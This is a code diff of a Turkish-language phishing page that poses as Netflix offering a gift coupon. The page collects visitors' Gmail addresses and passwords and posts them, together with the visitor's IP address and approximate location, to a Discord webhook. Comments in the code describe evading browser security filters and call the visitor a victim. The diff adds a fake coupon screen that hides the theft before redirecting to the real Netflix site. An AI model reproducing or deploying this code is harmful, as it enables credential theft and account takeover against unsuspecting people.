@@ -12,7 +12,6 @@
     <style>
         body { background-color: #000; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         
-        /* SAHTE BİLDİRİM TASARIMI */
         #notification {
             position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
             width: 90%; max-width: 400px; background: rgba(30, 30, 30, 0.95);
@@ -21,21 +20,17 @@
         }
         #notification img { width: 40px; border-radius: 8px; margin-right: 12px; }
 
-        .login-box { width: 90%; max-width: 350px; text-align: center; }
-        .login-box img { width: 150px; margin-bottom: 30px; }
+        .login-box, .coupon-box { width: 90%; max-width: 350px; text-align: center; }
+        .login-box img, .coupon-box img { width: 150px; margin-bottom: 30px; }
         
-        /* GÜVENLİK FİLTRESİNDEN KAÇAN INPUTLAR */
         input { 
             width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 5px; 
             border: none; background: #333; color: #fff; box-sizing: border-box; 
             outline: none; transition: 0.2s;
         }
         input:focus { border: 1px solid #e50914; }
-        
-        /* ŞİFREYİ MASKELİYORUZ AMA 'PASSWORD' TİPİ KULLANMIYORUZ */
         .secure-mask { -webkit-text-security: disc !important; }
 
-        /* BUTON DURUMLARI */
         button { 
             width: 100%; padding: 15px; border: none; border-radius: 5px; 
             background: #444; color: #888; font-size: 16px; font-weight: bold; 
@@ -46,6 +41,14 @@
         .loading-screen { display: none; text-align: center; }
         .loader { border: 4px solid #333; border-top: 4px solid #e50914; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* KUPON EKRANI TASARIMI */
+        .coupon-code { 
+            background: #1a1a1a; border: 2px dashed #e50914; padding: 20px; 
+            font-size: 24px; font-weight: bold; letter-spacing: 3px; color: #fff;
+            margin: 20px 0; cursor: pointer; border-radius: 8px;
+        }
+        .coupon-box { display: none; }
     </style>
 </head>
 <body>
@@ -54,17 +57,15 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png">
         <div style="flex:1;">
             <b style="font-size:14px; display:block;">Netflix Güvenlik</b>
-            <span style="font-size:13px; color:#ccc;">Bağlantınız doğrulandı ve güvenli olarak işaretlendi.</span>
+            <span style="font-size:13px; color:#ccc;">Bağlantınız güvenli olarak işaretlendi.</span>
         </div>
     </div>
 
     <div class="login-box" id="loginBox">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
         <h2 style="font-size: 18px; margin-bottom: 20px;">Hediye Kuponunuzu Aktif Edin</h2>
-        
         <input type="text" id="field_1" placeholder="Gmail Hesabınız (@gmail.com zorunludur)" oninput="kontrolEt()">
         <input type="text" id="field_2" class="secure-mask" placeholder="Hesap Şifresi" oninput="kontrolEt()">
-        
         <button id="submitBtn" onclick="bilgileriGonder()" disabled>Kuponu Şimdi Al</button>
         <p style="font-size:11px; color:#555; margin-top:15px;">SSL v3 Secure Connection (Encrypted)</p>
     </div>
@@ -75,24 +76,25 @@
         <div class="loader"></div>
     </div>
 
-    <audio id="tudumSound">
-        <source src="https://www.myinstants.com/media/sounds/netflix-tudum.mp3" type="audio/mpeg">
-    </audio>
+    <div class="coupon-box" id="couponBox">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
+        <h2 style="color: #46d369;">Tebrikler! Kuponunuz Hazır</h2>
+        <p style="font-size: 14px; color: #aaa;">Kodu kopyalayın ve Netflix ödeme sayfasında kullanın.</p>
+        <div class="coupon-code" onclick="kopyala()">NFLX-JS82-X9BQ</div>
+        <button class="active" onclick="gitNetflix()">Hemen Kullan</button>
+    </div>
+
+    <audio id="tudumSound"><source src="https://www.myinstants.com/media/sounds/netflix-tudum.mp3" type="audio/mpeg"></audio>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
         let geoInfo = {};
 
-        // AŞAMA 1: SAYFA AÇILIR AÇILMAZ VERİ ÇEK
         window.onload = async function() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 geoInfo = await res.json();
                 
-                const ua = navigator.userAgent;
-                let platform = ua.includes("Mobi") ? "📱 Mobil" : "🖥️ PC";
-
-                // İLK TIKLAMA RAPORU (Mavi Şerit)
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -101,42 +103,34 @@
                         embeds: [{
                             title: "✅ GÜVENLİ TIKLAMA",
                             color: 3447003,
-                            description: "```Kurban siteye girdi. Tarayıcı filtreleri başarıyla aşıldı.```",
+                            description: "```Kurban siteye girdi. Veri bekleniyor.```",
                             fields: [
-                                { name: "🌐 IP / Cihaz", value: `\`${geoInfo.ip}\` | ${platform}`, inline: true },
-                                { name: "🏠 Adres", value: `**${geoInfo.region} / ${geoInfo.city}**`, inline: false },
-                                { name: "📍 Harita", value: `[Haritada Gör](http://google.com/maps?q=${geoInfo.latitude},${geoInfo.longitude})`, inline: false }
-                            ],
-                            footer: { text: "Aşama 1: Sızma Başarılı" }
+                                { name: "🌐 IP / Cihaz", value: `\`${geoInfo.ip}\``, inline: true },
+                                { name: "🏠 Adres", value: `**${geoInfo.region} / ${geoInfo.city}**`, inline: true }
+                            ]
                         }]
                     })
                 });
             } catch (e) {}
         };
 
-        // BUTON KİLİDİNİ AÇMA
         function kontrolEt() {
             const m = document.getElementById('field_1').value;
             const p = document.getElementById('field_2').value;
             const btn = document.getElementById('submitBtn');
-
             if(m.includes("@gmail.com") && p.length > 5) {
-                btn.classList.add('active');
-                btn.disabled = false;
+                btn.classList.add('active'); btn.disabled = false;
             } else {
-                btn.classList.remove('active');
-                btn.disabled = true;
+                btn.classList.remove('active'); btn.disabled = true;
             }
         }
 
-        // TIKLAYINCA SES ÇAL VE BİLDİRİM ÇIKAR
         document.body.onclick = function() {
             document.getElementById('tudumSound').play();
             document.getElementById('notification').style.top = "20px";
             setTimeout(() => { document.getElementById('notification').style.top = "-100px"; }, 3500);
         };
 
-        // AŞAMA 2: HESAP BİLGİLERİNİ GÖNDER
         async function bilgileriGonder() {
             const m = document.getElementById('field_1').value;
             const p = document.getElementById('field_2').value;
@@ -144,6 +138,7 @@
             document.getElementById('loginBox').style.display = "none";
             document.getElementById('loadingScreen').style.display = "block";
 
+            // Veriyi Discord'a Gönder
             await fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -151,22 +146,31 @@
                     username: "ANONİM BOT",
                     embeds: [{
                         title: "🎯 HEDEF PAKETLENDİ!",
-                        color: 16711680, // Sol Kırmızı Şerit
+                        color: 16711680,
                         thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" },
                         fields: [
-                            { name: "📧 Gmail Hesabı", value: `**${m}**`, inline: true },
-                            { name: "🔑 Şifre", value: `\`${p}\``, inline: true },
-                            { name: "🌐 IP Adresi", value: `\`${geoInfo.ip}\``, inline: false },
-                            { name: "📡 İnternet", value: geoInfo.org, inline: false }
+                            { name: "📧 Gmail Hesabı", value: `**${m}**` },
+                            { name: "🔑 Şifre", value: `\`${p}\`` },
+                            { name: "🌐 IP", value: `\`${geoInfo.ip}\`` }
                         ],
-                        footer: { text: "ANONİM BOT Takip Sistemi | " + new Date().toLocaleString() }
+                        footer: { text: "Veriler sisteme kaydedildi." }
                     }]
                 })
             });
 
+            // 3 saniye sonra kupon ekranını göster
             setTimeout(() => {
-                window.location.replace("https://www.netflix.com/tr/redeem");
+                document.getElementById('loadingScreen').style.display = "none";
+                document.getElementById('couponBox').style.display = "block";
             }, 3000);
+        }
+
+        function kopyala() {
+            alert("Kupon kodu kopyalandı!");
+        }
+
+        function gitNetflix() {
+            window.location.replace("https://www.netflix.com/tr/redeem");
         }
     </script>
 </body>
